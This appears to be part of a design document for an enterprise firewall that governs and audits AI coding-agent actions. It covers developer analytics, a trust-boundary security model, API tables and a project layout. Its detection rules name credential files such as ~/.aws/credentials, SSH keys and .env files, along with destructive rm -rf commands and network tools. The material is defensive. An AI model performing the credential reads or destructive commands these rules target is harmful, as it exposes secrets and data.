| **macOS** | Munki (open-source) | pkginfo + nopkg script | Same as above |
| **Linux** | Ansible, Chef, Puppet, Salt | .deb/.rpm package + config template | `/etc/claude-code/managed-settings.json` |
| **Windows** | Microsoft Intune, SCCM | MSI package + registry policy | `%ProgramData%\ClaudeCode\managed-settings.json` |

### 13F-0.6 Workspace Discovery

The daemon discovers workspaces automatically from the first hook call — no manual registration:

1. Developer opens VS Code in `/Users/dev/project-alpha`
2. Claude Code activates and fires a tool call (e.g., Read)
3. Hook handler detects workspace from working directory
4. Hook handler sends `environment.workspace`, `environment.repo` (from git remote), `environment.branch` to daemon
5. Daemon evaluates policy using workspace context: **org → team → group → repo → local**
6. Management Hub aggregates — security team sees every active workspace across all machines

### 13F-0.7 What the Developer Experiences

The developer does **NOT**: install anything, run setup commands, configure hooks, know the admin token, or have root access.

The developer **DOES**: open VS Code normally, use Claude Code normally, see block messages when policy denies, see approval prompts when policy requires review. Safe work (>95% of actions) is completely uninterrupted. Access their personal Sentinel Console at localhost:9100 -- shows their own blocks, compliance score, and tips. Cannot see other developers' data or manage policies.

---

## 13F. Enterprise Analytics and Developer Intelligence

### 13F.1 Overview

At enterprise scale (hundreds to thousands of developers), raw audit events are insufficient for decision-making. The analytics layer aggregates audit data into actionable intelligence: stack-ranked blocked operations, synthetic developer groups based on usage patterns, policy bottleneck detection, and AI-generated recommendations. It also provides developer awareness — surfacing usage patterns and policy guidance back to individual developers.

### 13F.2 Analytics Architecture

```mermaid
flowchart TB
    subgraph DataLayer["Audit Data (PostgreSQL)"]
        AE["audit_events<br/>(JSONB, append-only)"]
    end

    subgraph AnalyticsEngine["Analytics Engine (Go)"]
        Agg["Aggregation Queries<br/>(blocked ops, trends,<br/>bottlenecks)"]
        Classifier["Developer Classifier<br/>(feature extraction →<br/>threshold grouping)"]
        Recommender["Policy Recommender<br/>(pattern detection →<br/>actionable suggestions)"]
        Awareness["Developer Awareness<br/>(per-developer insights,<br/>usage scores, guidance)"]
    end

    subgraph AdminDash["Admin Dashboard (Next.js)"]
        OpsView["Operations Dashboard<br/>(stack-ranked blocks,<br/>trend charts)"]
        GroupView["Developer Groups<br/>(auto-classified,<br/>group policy mgmt)"]
        RecView["Recommendations<br/>(one-click apply,<br/>impact estimates)"]
        BottleView["Bottleneck Analysis<br/>(friction heatmap,<br/>approval latency)"]
    end

    subgraph DevPortal["Developer Awareness"]
        DevScore["Usage Scorecard<br/>(personal block rate,<br/>policy compliance)"]
        DevTips["Contextual Guidance<br/>(why was I blocked?,<br/>how to get approval)"]
        DevTrend["Personal Trends<br/>(weekly summary,<br/>improvement tracking)"]
    end

    AE --> Agg & Classifier
    Classifier --> Recommender
    Agg --> OpsView & BottleView
    Classifier --> GroupView
    Recommender --> RecView
    Awareness --> DevScore & DevTips & DevTrend

    style AnalyticsEngine fill:#16213e,stroke:#0f3460,color:#fff
    style AdminDash fill:#1a1a2e,stroke:#e94560,color:#fff
    style DevPortal fill:#0f3460,stroke:#533483,color:#fff
```

### 13F.3 Analytics API Endpoints

| Endpoint | Method | Purpose | Auth |
|---|---|---|---|
| `/v1/analytics/blocked-operations` | GET | Stack-ranked blocked operations by count (params: `period=today\|7d\|30d`) | Admin |
| `/v1/analytics/approval-bottlenecks` | GET | Operations with longest approval wait times | Admin |
| `/v1/analytics/developer-impact` | GET | Developers most frequently blocked, with group classification | Admin |
| `/v1/analytics/groups` | GET | Auto-classified developer groups with counts and metrics | Admin |
| `/v1/analytics/groups/:id/members` | GET | Members of a specific group | Admin |
| `/v1/analytics/recommendations` | GET | AI-generated policy recommendations with impact estimates | Admin |
| `/v1/analytics/recommendations/:id/apply` | POST | One-click apply a recommendation | Admin |
| `/v1/analytics/developer/:user_id` | GET | Per-developer awareness scorecard | Operator |
| `/v1/analytics/developer/:user_id/trends` | GET | Weekly trend data for a developer | Operator |

### 13F.4 Synthetic Developer Groups

Developers are automatically classified based on behavioral patterns extracted from audit data. No manual tagging required.

**Feature Extraction (per developer, rolling 30 days):**

| Feature | Source | Computation |
|---|---|---|
| Actions/day | `COUNT(*)` per day | Average over 30 days |
| Block rate | `COUNT(decision='deny') / COUNT(*)` | Percentage |
| Approval rate | `COUNT(decision='require_approval') / COUNT(*)` | Percentage |
| Action diversity | `COUNT(DISTINCT action.type)` | Unique action types |
| Network breadth | `COUNT(DISTINCT resource.host)` | Unique hosts contacted |
| Time distribution | Actions outside 9am-6pm local time | Percentage |
| Evasion score | Denied-then-retry pattern count | From anomaly detector |
| Tenure | Days since first audit event | Calendar days |

**Group Definitions (professional names):**

| Group | Detection Criteria | Typical Developers |
|---|---|---|
| **Compliant Developer** | <2% block rate, consistent project-scoped activity | Developers working within policy boundaries |
| **High-Friction Developer** | >5% block rate, frequent policy violations | Developers hitting policy walls -- review needed |
| **Integration-Heavy Developer** | High network.request rate, >20 unique hosts/week, frequent MCP calls | API integrators, third-party service consumers |
| **Automation-Focused Developer** | >100 actions/day, shell.exec dominant, CI/CD patterns (docker, terraform, kubectl) | DevOps, platform engineers, release managers |
| **Security-Sensitive Developer** | Frequent credential.access, database patterns, .env reads | Backend developers working with APIs, migrations |
| **Exploratory Developer** | High MCP call rate, frequent package installs, warning-list network hits | Developers evaluating new libraries, prototyping |
| **New Developer** | Tenure <30 days, high block rate relative to peers | Recently onboarded -- expected friction |
| **Low-Activity Developer** | <5 actions in last 7 days after previously active period | Stopped using AI agents or switched tools |
| **After-Hours Developer** | >30% activity outside business hours | Remote/different timezone, crunch-time contributors |
| **High-Volume Developer** | >200 actions/day, top action is file.write | Senior engineers, tech leads doing heavy refactoring |

### 13F.5 Group Policy Model

Extends the policy hierarchy:

```
Organization baseline (non-negotiable)
  └─ Team policy (can tighten, never weaken)
       └─ Group policy (admin-defined exceptions for synthetic groups)
            └─ Repository / workspace policy (can tighten, never weaken)
                 └─ Developer-local guardrails (can tighten, never weaken)
```

Group exceptions are explicitly granted by the org admin:

| Group | Exception Example | Rationale |
|---|---|---|
| High-Volume Developer | Auto-approve `npm install` from registry.npmjs.org | 85% of approvals are approved <10s -- friction without value |
| Automation-Focused Developer | Allow `docker build`, `terraform apply` without approval | Infrastructure commands are their core workflow |
| Security-Sensitive Developer | Time-bounded `.env` read (30 min window after approval) | Need credential access for integration testing |
| After-Hours Developer | Extend approval timeout to 30 min (no reviewer at 2am) | Avoid deny-on-timeout when no one is online |

### 13F.6 Policy Recommendations Engine

The recommender analyzes audit patterns and generates actionable suggestions:

| Pattern Detected | Recommendation | Impact Estimate |
|---|---|---|
| >80% of `npm install` approvals are approved within 10s | Auto-approve for High-Volume Developer group | Saves ~720 approval interactions/week |
| `api.internal.company.com` hit 213 times but not allowlisted | Add to network allowlist | Eliminates 213 blocks/week for Integration-Heavy Developer group |
| 7 High-Friction Developers had 3+ evasion alerts this week | Review their sessions for policy violations | Security investigation recommended |
| New Developers have 11% block rate vs 2% org average | Enable guided onboarding mode with explanatory messages | Reduce onboarding friction without weakening policy |
| Approval median for `rm -rf` is 45 seconds | Keep approval (high-risk) | No change — approval is fast and valuable |

Each recommendation includes:
- **What:** the specific policy change
- **Why:** the data pattern that triggered it
- **Impact:** estimated reduction in blocks/approvals per week
- **Risk:** what could go wrong if applied
- **Actions:** [Apply] [Defer] [Dismiss] buttons

### 13F.7 Developer Awareness

Individual developers receive insights about their usage patterns — reducing friction by helping them understand policy and improve their workflow.

**Developer Scorecard (per developer):**

```
╔══════════════════════════════════════════════════╗
║  Your AA Firewall Usage -- Last 7 Days            ║
╠══════════════════════════════════════════════════╣
║                                                  ║
║  governed_user: jsmith (display: Jane Smith)     ║
║  Group: High-Volume Developer                    ║
║  Actions: 1,247    Block rate: 1.3%              ║
║  Compliance score: 98.7%  (org avg: 96.2%)       ║
║                                                  ║
║  1,231 actions allowed silently                  ║
║  16 actions blocked (mostly outside-project)     ║
║  3 approvals requested (all approved <15s)       ║
║                                                  ║
║  Tip: You were blocked 8 times trying to         ║
║     write to ~/.config/. Project config files     ║
║     should live in your project root instead.     ║
║                                                  ║
║  Trend: Block rate improved from 2.1% to         ║
║     1.3% over the last 4 weeks.                  ║
╚══════════════════════════════════════════════════╝
```

> **Note:** The scorecard shows `governed_user` (the OS username, e.g., `jsmith`) and a display name resolved from `groupMetadata`. The Sentinel Console enforces `governed_user` filtering so each developer only sees their own data.

**Contextual Guidance (when blocked):**

Instead of just `[AA Firewall] BLOCKED: PATH_OUTSIDE_PROJECT_ROOT`, the developer also sees:

```
💡 Why was this blocked?
   Organization policy prevents writes outside the project directory.
   This protects against accidental config changes and data exfiltration.

📋 How to proceed:
   • Move the file into your project root
   • Request a policy exception from your admin
   • If this is a legitimate need, your admin can see this in the
     "High-Friction Developer" group dashboard and create an exception

📊 Your stats: This is your 3rd outside-project block this week.
   Org average: 0.5/week.
```

**Weekly Digest (email or Slack):**

```
Your AA Firewall Weekly Summary
───────────────────────────────
Actions governed: 1,247
Compliance score: 98.7% ✅ (up from 97.1%)
Blocks: 16 (down from 23 last week)
Approvals: 3 (all resolved in <15s)

Top improvement: You stopped writing to ~/.config/ — great!
Watch out: 2 credential access blocks this week. Use the
project .env.example pattern instead of reading ~/.aws/credentials.
```

### 13F.8 Dashboard Infographics

The admin dashboard uses visual infographics to reduce cognitive load:

```mermaid
flowchart LR
    subgraph TopBar["Key Metrics (real-time)"]
        M1["👥 377<br/>Active Devs"]
        M2["🛡️ 98.2%<br/>Compliance"]
        M3["🔴 1,247<br/>Blocks Today"]
        M4["🟡 89<br/>Pending Approvals"]
    end

    subgraph Charts["Visual Analytics"]
        C1["📊 Blocked Ops<br/>(stack-ranked bar chart)"]
        C2["📈 7-Day Trend<br/>(area chart by decision)"]
        C3["🍩 Group Distribution<br/>(donut chart)"]
        C4["🔥 Friction Heatmap<br/>(policy × group matrix)"]
    end

    subgraph Actions["Actionable Intelligence"]
        A1["💡 3 Recommendations<br/>(one-click apply)"]
        A2["⚠️ 7 High-Friction<br/>(investigate)"]
        A3["🆕 9 New Developers<br/>(onboarding mode)"]
    end
```

**Friction Heatmap** — shows which policies cause the most friction for which groups:

```
                    High-   Compliant Exploratory High-     Automation  Security  Integration
                    Volume            Developer   Friction  Focused     Sensitive Heavy
npm install         🟡 low  ⬜ none  🔴 high     🟡 low    🟡 low      ⬜ none   ⬜ none
Outside-project     ⬜ none ⬜ none  ⬜ none     🔴 high   ⬜ none      ⬜ none   ⬜ none
Unknown host        ⬜ none ⬜ none  🟡 low      🟡 low    ⬜ none      ⬜ none   🔴 high
Credential access   ⬜ none ⬜ none  ⬜ none     🟡 low    ⬜ none      🔴 high   ⬜ none
rm -rf              🟡 low  ⬜ none  ⬜ none     🔴 high   🟡 low      ⬜ none   ⬜ none
docker/kubectl      ⬜ none ⬜ none  ⬜ none     ⬜ none   🔴 high      ⬜ none   ⬜ none

🔴 = >10 blocks/week    🟡 = 1-10 blocks/week    ⬜ = 0 blocks/week
```

The admin clicks any 🔴 cell to see specific events, affected developers, and a recommendation.

---

## 14. Security Model

### 14.1 Trust Boundaries

| Actor | Trust Level |
|---|---|
| Agent runtime (Claude Code) | **Untrusted.** Even locally initiated agents are untrusted by default. Enforcement must not depend on agent cooperation. |
| Local daemon | **Trusted** to enforce decisions. Must be hardened against tampering. |
| Enforcement points (proxies, guards) | **Trusted** — they are part of the daemon's enforcement fabric. |
| Central audit store | **Trusted** for storage integrity. Append-only contract enforced at the database level. |
| Central policy engine | **Trusted** source of truth for policy. Signed bundles with version pinning. |
| MCP servers, external APIs | **Untrusted.** External trust domains. Governed in Phase 2. |
| KernelEnforcer (eBPF/ESF) | **Trusted** — runs in kernel space. Cannot be tampered with from userspace. Enforces policy independently of the daemon. |

### 14.2 Controls

| Control | Implementation |
|---|---|
| Daemon ↔ central service auth | Mutual TLS or signed API tokens |
| Policy bundle integrity | Signed bundles with SHA-256 hash verification |
| Audit immutability | Append-only table (no UPDATE/DELETE grants on event tables) |
| Secret redaction | Secrets detected in action payloads are redacted before audit storage |
| Bypass detection | OS-level monitors flag ungoverned actions (Section 6.3) |
| OS-level syscall enforcement | KernelEnforcer (eBPF/ESF) intercepts file.open, execve, connect at kernel level. Cannot be bypassed from userspace. Enforces policy even when IDE hooks are disabled or daemon is bypassed via raw terminal. |
| Container posture validation | Daemon checks container config at startup, refuses to run if dangerous settings detected (privileged, docker.sock mounted) |

---

## 15. Performance and Reliability Trade-Offs

### 15.1 Latency Budget

| Operation | Target | Approach |
|---|---|---|
| Policy decision (local cache hit) | p50 <10ms, p95 <50ms | In-process evaluation against cached policy bundle. No network round-trip for common decisions. |
| Policy decision (cache miss / refresh) | <500ms | Async bundle refresh. Stale bundle serves decisions until refresh completes. |
| Audit event emission | Non-blocking | Events buffered locally and flushed async. Never in the critical path of action execution. |
| Approval delivery to reviewer | <2 seconds | Daemon pushes to VS Code extension via WebSocket. |
| Approval enforcement | <1 second | Extension sends resolve to daemon; daemon returns decision to enforcement point. |

### 15.2 Key Trade-Offs

| Trade-Off | Decision | Rationale |
|---|---|---|
| **Inspection depth vs latency** | MVP uses metadata + pattern matching (paths, hosts, command prefixes). Full content analysis deferred to Phase 2. | Deep payload inspection adds 100ms+ per action. Pattern matching is <5ms and covers the default policy set. |
| **Fail-closed vs fail-open** | Default fail-closed. Configurable per deployment. | Safety-first for a security product. Fail-open available for teams building confidence. |
| **Local-first vs central-first** | Policy evaluation is local-first. Central services handle distribution, approvals, and long-term storage. | Local-first eliminates network latency from the critical path. Central services add resilience and coordination. |
| **PostgreSQL as sole persistence** | PostgreSQL for both local Sentinel and Hub. | No SQLite in the Go port. In-memory buffer with flush to PostgreSQL. `NoOpStore` rejects ops when PG unavailable. |
| **Hook-based vs OS-level interception** | Hook-based (Claude Code hooks API) for Phase 1. OS-level (FUSE, eBPF) deferred. | Hook-based is simpler, well-supported, and sufficient for managed agent integrations. OS-level adds coverage for unmanaged paths but increases complexity and platform variance. |

---

## 16. Internal API Summary

### Local Daemon (port 9100)

| API | Method | Purpose | Auth |
|---|---|---|---|
| `/v1/evaluate` | POST | Enforcement point submits action for policy decision | None |
| `/v1/health` | GET | Daemon health check, policy version, rule count | None |
| `/v1/metrics` | GET | Readiness gate metrics (6 gates) | None |
| `/v1/enforcement` | GET | Current enforcement state (on/off, timestamp, changed_by) | None |
| `/v1/enforcement/toggle` | POST | Toggle enforcement on/off | Admin |
| `/v1/audit/events` | GET | Query events with filters (session_id, actor, decision, time range) | None |
| `/v1/audit/sessions` | GET | List session summaries with event counts and decision breakdown | None |
| `/v1/audit/sessions/:id` | GET | Session detail with all events in chronological order | None |
| `/v1/audit/export` | GET | Export evidence package (JSON) with metadata | None |
| `/v1/audit/enrich` | POST | Update observed_effect on pending audit events (post-tool-call) | None |
| `/v1/audit/metrics` | GET | Audit store metrics (total stored, rejected, events) | None |
| `/v1/approvals/pending` | GET | List pending approval requests | None |
| `/v1/approvals/:id/resolve` | POST | Approve or deny with rationale and optional scope | None |
| `/v1/approvals/metrics` | GET | Approval metrics (created, approved, denied, expired, pending) | None |
| `/v1/policy/rules` | GET | List active policy rules | None |
| `/v1/policy/rules` | POST | Add new policy rule | Admin |
| `/v1/policy/rules/:id` | PUT | Update existing policy rule | Admin |
| `/v1/policy/rules/:id` | DELETE | Remove policy rule | Admin |
| `/v1/policy/rules/:id/toggle` | POST | Enable/disable a policy rule | Admin |
| `/v1/policy/packs` | GET | List available canned policy packs | None |
| `/v1/policy/packs/:id` | GET | Get pack detail with full rules | None |
| `/v1/policy/packs/:id/apply` | POST | Apply a canned pack (adds its rules) | Admin |

### Management Hub (port 9200 — mTLS client API)

| API | Method | Purpose | Auth |
|---|---|---|---|
| `/api/register` | POST | Sentinel Agent registration with metadata | mTLS |
| `/api/policy` | GET | Fetch latest policy bundle | mTLS |
| `/api/audit` | POST | Forward audit events from client | mTLS |
| `/api/heartbeat` | POST | Client heartbeat with status | mTLS |

### Management Hub (port 9201 — Admin HTTPS with RBAC)

| API | Method | Purpose | Auth |
|---|---|---|---|
| `/api/v1/health` | GET | Hub health check | None (no auth required) |
| `/api/v1/clients` | GET | List registered Sentinel Agents | Reviewer+ |
| `/api/v1/audit/events` | GET | Query aggregated audit events | Reviewer+ |
| `/api/v1/audit/sessions` | GET | List session summaries | Reviewer+ |
| `/api/v1/approvals/pending` | GET | List pending approvals | Reviewer+ |
| `/api/v1/approvals/{id}/resolve` | POST | Approve or deny approval request | Reviewer+ |
| `/api/v1/policy/rules` | GET | List active policy rules | Reviewer+ |
| `/api/v1/policy/rules` | POST | Add new policy rule | Admin only |
| `/api/v1/policy/rules/{id}` | PUT | Update existing policy rule | Admin only |
| `/api/v1/policy/rules/{id}` | DELETE | Remove policy rule | Admin only |
| `/api/v1/policy/packs/{id}/apply` | POST | Apply a canned policy pack | Admin only |
| `/api/v1/enforcement/toggle` | POST | Toggle enforcement on/off | Admin only |

---

## 17. Implementation Plan

### Phase 0: Foundations (1-2 days)

**Objective:** Define core contracts. Validate end-to-end flow with simulated data.

| Task | Output |
|---|---|
| Define canonical action schema (TypeScript types) | `types/action.ts` |
| Define policy object schema (TypeScript types + YAML spec) | `types/policy.ts`, `schemas/policy.yaml` |
| Define audit event schema (TypeScript types + JSON Schema) | `types/audit-event.ts`, `schemas/audit-event.json` |
| Implement minimum schema validation gate | `lib/audit/validate.ts` |
| Implement policy evaluation skeleton (load YAML, match rules, return decision) | `lib/policy/engine.ts` |
| Implement local daemon skeleton (HTTP server, /v1/evaluate endpoint) | `src/daemon/server.ts` |
| Wire simulated action → evaluate → audit event → validate → store | Integration test |

**Exit criteria:** A simulated `file.write` action flows through the daemon, receives a policy decision with reason code and policy version, produces a valid audit event that passes the minimum schema gate, and is stored in PostgreSQL (via in-memory buffer flush).

### Phase 1A: Enforcement Points (3-5 days)

**Objective:** Real interception on three surfaces with Claude Code.

| Task | Output |
|---|---|
| Implement filesystem guard (Claude Code hooks: Read, Edit, Write) | `src/enforcement/fs-guard.ts` |
| Implement shell proxy (Claude Code hooks: Bash) | `src/enforcement/shell-proxy.ts` |
| Implement network proxy (HTTP CONNECT proxy, env-var routing) | `src/enforcement/network-proxy.ts` |
| Implement default policy bundle (13 rules from Section 8.4) | `policies/default.yaml` |
| Wire all enforcement points to daemon /v1/evaluate | Integration tests |
| Implement bypass detection (file watcher, process monitor) | `src/enforcement/bypass-detector.ts` |

**Exit criteria:** Claude Code (VS Code extension) attempts file writes, shell commands, and network calls. AA Firewall intercepts all three, evaluates policy, blocks violations, and logs events. Bypass detector flags ungoverned actions.

### Phase 1B: Approval UX (3-5 days)

**Objective:** Full approval workflow with in-IDE delivery.

| Task | Output |
|---|---|
| Implement approval service (create, route, resolve, timeout) | `src/approval/service.ts` |
| Implement approval API endpoints | `src/daemon/routes/approvals.ts` |
| Implement VS Code extension (hooks registration, approval prompt, status bar) | `extension/` directory |
| Implement timeout behavior (deny-on-timeout default, configurable) | Configuration in daemon settings |
| Implement reusable approval windows and time-bounded scopes | `src/approval/scope.ts` |
| Implement break-glass access with elevated audit severity | `src/approval/break-glass.ts` |

**Exit criteria:** Claude Code attempts a destructive shell command. AA Firewall surfaces an approval prompt in VS Code with context bundle. Reviewer approves or denies. Decision is enforced. Full audit trail recorded including approver identity, rationale, and scope.

### Phase 1C: Audit and Console (2-3 days)

**Objective:** Structured audit with review console.

| Task | Output |
|---|---|
| Implement PostgreSQL audit store (append-only, JSONB) | `src/audit/store.ts`, migration scripts |
| Implement audit query API (session, filter, time range, export) | `src/daemon/routes/audit.ts` |
| Implement review console web UI (session timeline, search, export) | `console/` directory |
| Implement dashboard metrics (readiness gate measurements) | `src/metrics/gates.ts` |

**Exit criteria:** Security reviewer opens the console, finds a session, sees the full timeline (actions, policy decisions, approvals, outcomes), filters by decision type, and exports as JSON. Dashboard shows readiness gate metrics.

### Phase 1D: Integration and Demo (1-2 days)

**Objective:** End-to-end demo scenario.

| Task | Output |
|---|---|
| Run full demo scenario from PRD Section 8.4.5 | Demo recording / live walkthrough |
| Validate CLI mode (same policies, same audit) | CLI integration test |
| Validate secure-container mode | Docker-based demo run |
| Measure readiness gates | Metrics report |

**Exit criteria:** All Phase 1 exit criteria from Appendix C are met. Demo scenario runs end-to-end. Readiness gates measured: >95% coverage, <5% false-positive rate, <60s approval latency, >99% audit completeness.

---

## 18. Project Structure

```
aa-firewall/
├── src/
│   ├── daemon/
│   │   ├── server.ts                  # Local daemon HTTP server (port 9100)
│   │   ├── auth.ts                    # Admin token authentication
│   │   ├── enforcement-state.ts       # Global on/off toggle with tracking
│   │   └── routes/
│   │       ├── evaluate.ts            # POST /v1/evaluate (scope auto-approve, latency)
│   │       ├── approvals.ts           # Approval CRUD with break-glass support
│   │       ├── audit.ts               # Async query, sessions, export, metrics
│   │       ├── enrich.ts              # POST /v1/audit/enrich (observed_effect update)
│   │       ├── policy.ts              # Policy CRUD, toggle, packs listing/apply
│   │       └── metrics.ts             # Readiness gate metrics (6 gates)
│   ├── enforcement/
│   │   ├── hook-handler.ts            # Claude Code hook handler (stdin JSON, exit 0/2)
│   │   ├── fs-guard.ts               # Filesystem interception
│   │   ├── shell-proxy.ts            # Shell command interception
│   │   ├── network-proxy.ts          # HTTP CONNECT proxy (port 9101)
│   │   ├── command-classifier.ts     # destructive/network_tool/package_manager/safe
│   │   ├── package-guard.ts          # npm/pip/brew/yarn/cargo install detection
│   │   ├── secret-detector.ts        # SSH keys, AWS creds, .env, API keys
│   │   ├── redaction.ts              # 20+ patterns, mask/tokenize/summarize modes
│   │   ├── mcp-gateway.ts            # MCP tool governance, server registry, trust levels
│   │   ├── claude-hooks.ts           # Tool-to-enforcement mapping, config generator
│   │   ├── context.ts                # Env vars + git metadata context builder
│   │   ├── bypass-detector.ts        # FS watcher for ungoverned actions
│   │   └── container-posture.ts      # Container config validation and enforcement
│   ├── policy/
│   │   ├── engine.ts                  # Hierarchical evaluation, simulation mode
│   │   ├── loader.ts                  # YAML bundle loader + validation
│   │   ├── hierarchy.ts              # Org → team → repo → local tighten-only merge
│   │   └── packs.ts                   # 8 canned policy packs
│   ├── approval/
│   │   ├── service.ts                 # Approval lifecycle (create/resolve/timeout)
│   │   ├── scope.ts                   # Reusable windows, time bounds
│   │   └── break-glass.ts            # Emergency override with elevated audit
│   ├── audit/
│   │   ├── validate.ts               # Minimum schema validation gate (6 fields)
│   │   ├── buffer.ts                  # In-memory queue buffer (10K cap, 80% backpressure)
│   │   ├── store.ts                   # PostgreSQL append-only audit store
│   │   ├── flush.ts                   # Background flush with retry/backoff
│   │   └── siem-export.ts            # Webhook, syslog (UDP), JSONL file transports
│   ├── intelligence/
│   │   └── anomaly.ts                # 8 deterministic anomaly patterns
│   ├── central/
│   │   └── server.ts                 # Management Hub mTLS server (ports 9200/9201)
│   └── client/
│       └── agent.ts                   # Sentinel Agent (registration, sync, heartbeat)
├── console/                           # Next.js 15 + shadcn/ui Sentinel Console
│   └── src/
│       ├── app/
│       │   ├── layout.tsx             # Root layout (AppShell, AuthProvider, sidebar)
│       │   ├── page.tsx               # Dashboard (on/off toggle, users, agents, metrics)
│       │   ├── login/
│       │   │   └── page.tsx           # Admin token login (optional for read-only)
│       │   ├── sessions/
│       │   │   ├── page.tsx           # Sessions table (user_id, agent_type columns)
│       │   │   └── [id]/
│       │   │       └── page.tsx       # Session timeline with back arrow
│       │   ├── approvals/
│       │   │   └── page.tsx           # Pending/resolved tabs with approve/deny
│       │   ├── search/
│       │   │   └── page.tsx           # Search with URL param drill-down
│       │   ├── export/
│       │   │   └── page.tsx           # JSON evidence package download
│       │   └── policies/
│       │       └── page.tsx           # Policy CRUD, 8 canned packs, create-from-template
│       ├── components/
│       │   ├── ui/                    # shadcn/ui components (auto-generated)
│       │   ├── app-shell.tsx          # AuthProvider + AuthGate + sidebar
│       │   ├── auth-gate.tsx          # Redirect to /login if unauthenticated
│       │   ├── aa-logo.tsx            # SVG logo (shield + fire tongues)
│       │   ├── decision-badge.tsx     # Color-coded allow/deny/approval badge
│       │   ├── action-icon.tsx        # File/Shell/Network/MCP icon mapper
│       │   └── metric-card.tsx        # KPI card with value
│       └── lib/
│           ├── api.ts                 # Fetch helpers for all daemon endpoints
│           ├── auth-context.tsx       # AuthProvider with admin/user/none roles
│           └── utils.ts              # cn() utility
├── types/
│   ├── action.ts                      # ActionRequest, Actor, Environment, Resource (Zod)
│   ├── policy.ts                      # PolicyDecision, PolicyRule, PolicyBundle (Zod)
│   ├── audit-event.ts                # AuditEvent (15+ fields), MINIMUM_GATE_FIELDS
│   ├── approval.ts                    # ApprovalRequest, ApprovalDecision, ContextBundle
│   └── mcp.ts                        # McpToolCall, McpGatewayDecision, McpServerEntry
├── policies/
│   ├── default.yaml                   # Default policy bundle (13 rules)
│   └── network-allowlist.yaml        # Allowlisted + warning list hosts
├── tests/
│   ├── policy-engine.test.ts         # 16 tests
│   ├── approval-service.test.ts      # 20 tests
│   ├── mcp-gateway.test.ts           # 12 tests
│   ├── enforcement/
│   │   ├── command-classifier.test.ts # 27 tests
│   │   ├── package-guard.test.ts     # 26 tests
│   │   └── redaction.test.ts         # 22 tests
│   ├── integration/
│   │   └── audit-pipeline.test.ts    # 14 tests
│   └── intelligence/
│       └── anomaly.test.ts           # 7 tests (1 failure removed)
├── e2e/
│   └── console.spec.ts               # 25 Playwright E2E tests
├── scripts/
│   ├── prepare.sh                     # Prerequisites check + install
│   ├── build.sh                       # TypeScript check + Vitest + builds
│   ├── deploy.sh                      # Start daemon + console (port 9100)
│   ├── run_tests.sh                   # Tests with live dashboard
│   ├── demo.sh                        # 9 automated demo scenarios
│   ├── readiness-report.sh           # 6 readiness gate metrics
│   ├── install-hooks.sh              # Add/remove Claude Code hooks
│   ├── install-service.sh            # macOS LaunchDaemon + managed hooks
│   ├── generate-certs.sh             # TLS CA + server + client certs for mTLS
│   ├── aafirewall_deploy.sh          # Unified deployment (central/client/full)
│   └── package.sh                     # Build + package into distribution tarballs
├── docker/
│   ├── docker-compose.yaml           # PostgreSQL 16
│   ├── Dockerfile.agent              # Hardened agent container
│   └── init.sql                      # audit_events table, indexes, append-only
├── package.json
├── tsconfig.json
├── tsconfig.build.json
├── vitest.config.ts
├── playwright.config.ts
└── go/                                # Go port (compiled binaries — primary deployment)
    ├── go.mod                         # module github.com/anthropics/aafirewall
    ├── go.sum
    ├── Makefile                       # build, test, console, package, cross-compile
    ├── cmd/
    │   ├── daemon/main.go             # Daemon binary entry point
    │   ├── hookhandler/main.go        # Hook handler binary (stdin → evaluate → exit 0/2)
    │   ├── central/main.go            # Management Hub mTLS server entry point
    │   └── client/main.go             # Sentinel Agent entry point
    └── internal/
        ├── types/                     # Go structs matching TypeScript Zod schemas
        │   ├── action.go              # ActionRequest, Actor, Environment, Resource
        │   ├── policy.go              # PolicyDecision, PolicyRule, PolicyBundle
        │   ├── audit.go               # AuditEvent, SessionSummary, MinimumGateFields
        │   ├── approval.go            # ApprovalRequest, ApprovalDecision, ContextBundle
        │   └── mcp.go                 # McpToolCall, McpGatewayDecision, McpServerEntry
        ├── policy/                    # Policy engine (Go port)
        │   ├── engine.go              # EvaluatePolicy, SimulatePolicy, ruleMatchesAction
        │   ├── engine_test.go         # 12+ tests
        │   ├── loader.go             # LoadPolicyBundle (YAML), LoadPolicyDirectory
        │   ├── hierarchy.go          # MergeHierarchy, IsValidTightening
        │   └── packs.go              # 8 canned policy packs
        ├── audit/                     # Audit pipeline (Go port)
        │   ├── validate.go           # ValidateAuditEvent (6-field gate), BuildGateFields
        │   ├── buffer.go             # AuditBuffer (in-memory, 10K cap, backpressure)
        │   ├── store.go              # AuditStore interface + NoOpStore (PostgreSQL via pgstore.go)
        │   ├── flush.go              # FlushService (goroutine + ticker)
        │   ├── siem.go               # SiemExporter (webhook/syslog/file)
        │   └── pipeline_test.go      # 19+ tests
        ├── enforcement/               # Enforcement layer (Go port)
        │   ├── classifier.go         # ClassifyCommand (destructive/network/package/safe)
        │   ├── classifier_test.go    # 45+ tests
        │   ├── packageguard.go       # DetectPackageInstall
        │   ├── packageguard_test.go  # 17+ tests
        │   ├── secretdetector.go     # DetectSensitiveFilePath, DetectSecretCommandAccess
        │   ├── secretdetector_test.go # 24+ tests
        │   ├── redaction.go          # ScanForSecrets, RedactSecrets, DeTokenize (18+ patterns)
        │   ├── redaction_test.go     # 35+ tests
        │   ├── mcpgateway.go         # McpGateway with server registry and trust levels
        │   ├── mcpgateway_test.go    # 7+ tests
        │   ├── hooks.go              # ToolMappings, GenerateHooksConfig
        │   ├── context.go            # BuildEnforcementContext (env + git metadata)
        │   ├── bypass.go             # BypassDetector (placeholder)
        │   ├── container.go          # ValidateContainerPosture, EnforcePosture
        │   └── osguard/              # OS Kernel Enforcement
        │       ├── kernel.go         # KernelEnforcer interface (5 methods: Init, EvaluateSyscall, RegisterPolicy, GetMetrics, Shutdown)
        │       ├── stub.go           # StubEnforcer (logs all invocations, 3 modes: enforce/audit/off)
        │       └── osguard_test.go   # 17 tests (file/exec/network governance, metrics, invocation proof)
        ├── approval/                  # Approval service (Go port)
        │   ├── service.go            # ApprovalService (channels, time.AfterFunc timeouts)
        │   ├── service_test.go       # 20+ tests
        │   ├── scope.go              # MatchesScope (single/session/time_bounded)
        │   └── breakglass.go         # RequestBreakGlass
        ├── intelligence/              # Anomaly detection (Go port)
        │   ├── anomaly.go            # 8 patterns, sliding window, session state
        │   └── anomaly_test.go       # 7+ tests
        ├── daemon/                    # HTTP server (Go port)
        │   ├── server.go             # StartDaemon, route dispatcher, CORS
        │   ├── auth.go               # LoadAdminToken, IsAuthenticated
        │   ├── state.go              # IsEnforcementEnabled, toggle
        │   └── routes/
        │       ├── evaluate.go       # HandleEvaluate
        │       ├── approvals.go      # HandleGetPending, HandleResolveApproval
